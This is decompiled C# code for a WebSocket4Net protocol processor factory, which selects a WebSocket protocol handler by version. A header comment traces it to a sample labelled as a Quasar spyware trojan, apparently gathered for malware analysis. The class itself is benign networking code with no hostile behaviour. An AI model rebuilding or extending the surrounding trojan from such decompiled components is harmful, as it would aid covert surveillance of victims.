// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.WebSocket4Net.Protocol.ProtocolProcessorFactory
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Models.Delegates;
using System.Collections.Generic;

namespace NoiseMe.Drags.App.Models.WebSocket4Net.Protocol
{
  internal class ProtocolProcessorFactory
  {
    private IProtocolProcessor[] m_OrderedProcessors;

    public ProtocolProcessorFactory(params IProtocolProcessor[] processors) => this.m_OrderedProcessors = ((IEnumerable<IProtocolProcessor>) processors).OrderByDescending<IProtocolProcessor, int>((Func<IProtocolProcessor, int>) (p => (int) p.Version)).ToArray<IProtocolProcessor>();

    public IProtocolProcessor GetProcessorByVersion(WebSocketVersion version) => ((IEnumerable<IProtocolProcessor>) this.m_OrderedProcessors).FirstOrDefault<IProtocolProcessor>((Func<IProtocolProcessor, bool>) (p => p.Version == version));

    public IProtocolProcessor GetPreferedProcessorFromAvialable(int[] versions)
    {
      foreach (int num in ((IEnumerable<int>) versions).OrderByDescending<int, int>((Func<int, int>) (i => i)))
      {
        foreach (IProtocolProcessor orderedProcessor in this.m_OrderedProcessors)
        {
          int version = (int) orderedProcessor.Version;
          if (version >= num)
          {
            if (version <= num)
              return orderedProcessor;
          }
          else
            break;
        }
      }
      return (IProtocolProcessor) null;
    }
  }
}
